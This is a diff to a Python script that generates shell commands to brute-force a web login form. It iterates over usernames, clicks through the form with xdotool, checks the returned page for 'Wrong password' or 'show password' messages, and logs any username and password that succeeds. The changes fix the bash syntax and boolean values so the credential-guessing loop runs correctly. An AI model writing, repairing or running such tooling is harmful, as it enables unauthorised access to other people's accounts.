@@ -114,39 +114,37 @@ for user in usernames:
     # Add a delay
     commands.append(f"sleep {delay}")
     
-    commands.append(f"sleep {wait_load}")
+    commands.append(f"sleep {wait_load()}")
     commands.append(f"xdotool mousemove {all_data} click 1")
     
     # Process page result.
     # Check whether a wrong password was submitted.
-    commands.append(f"result=`cat {output_dir}/$file | grep -i 'Wrong password. Try again' | wc -c`")
+    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'Wrong password. Try again' | wc -c`")
     commands.append("if [ $result -eq 0 ]")
     commands.append("then")
-    commands.append("incorrect_pass=False")
+    commands.append("incorrect_pass=false")
     commands.append("else")
-    commands.append("incorrect_pass=True")
+    commands.append("incorrect_pass=true")
     commands.append("fi")
-    commands.append("done")
     
     # Check whether a show password option exists.
-    commands.append(f"result=`cat {output_dir}/$file | grep -i 'show password' | wc -c`")
+    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'show password' | wc -c`")
     commands.append("if [ $result -eq 0 ]")
     commands.append("then")
+    commands.append("show_pass=false")
     commands.append("else")
     commands.append("show_pass=true")
     commands.append("fi")
-    commands.append("done")
     
     # Determine whether the login was successful.
     commands.append("if [ $show_pass = true ] || [ $incorrect_pass = true ]")
     commands.append("then")
-    commands.append("success=False")
+    commands.append("success=false")
     commands.append("else")
-    commands.append("success=True")
+    commands.append("success=true")
     commands.append("fi")
-    commands.append("done")
     
-    commands.append("if [ $success = True ]")
+    commands.append("if [ $success = true ]")
     commands.append("then")
     commands.append(f"echo \"{user} Success {password}\" {output_dir}/results.txt")
     commands.append("exit")
